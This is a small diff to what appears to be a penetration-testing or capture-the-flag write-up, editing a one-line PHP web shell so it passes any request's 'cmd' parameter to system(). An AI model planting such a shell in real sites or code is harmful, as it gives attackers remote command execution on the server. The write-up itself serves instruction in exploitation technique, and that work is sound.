@@ -408,7 +408,7 @@ Thats right, beside the **mysql** error the file was created:
 Lets create a simple php shell:
 
 ````php
-<?php system($_GET[\'cmd\']); ?>
+<?php system($_REQUEST[\'cmd\']); ?>
 ````
 
 ````php
